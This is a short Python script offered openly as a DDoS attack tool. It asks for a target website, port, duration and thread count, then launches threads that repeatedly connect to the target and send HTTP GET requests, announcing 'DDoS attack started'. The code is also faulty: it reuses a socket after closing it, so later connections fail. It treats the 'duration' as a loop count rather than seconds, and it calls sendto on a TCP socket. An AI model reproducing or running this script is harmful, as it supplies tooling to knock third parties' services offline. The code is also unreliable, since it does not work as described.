import socket
import threading
import time

def ddos(target, port, duration):
    # Convert duration to seconds
    duration = int(duration)

    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Send packets
    for _ in range(duration):
        try:
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            print(f"Sent packet to {target}:{port}")
        except Exception as e:
            print(f"Could not send packet to {target}:{port}. Error: {e}")
        finally:
            s.close()

    print(f"Finished sending packets to {target}:{port}")

def main():
    target = input("Enter the target website (e.g., example.com): ")
    port = int(input("Enter the port (e.g., 80 or 443): "))
    duration = int(input("Enter the duration in seconds: "))
    threads = int(input("Enter the number of threads: "))

    print(f"Starting DDoS attack on {target}:{port} for {duration} seconds with {threads} threads.")

    # Create threads
    for _ in range(threads):
        threading.Thread(target=ddos, args=(target, port, duration)).start()

    print("DDoS attack started.")

if __name__ == "__main__":
    main()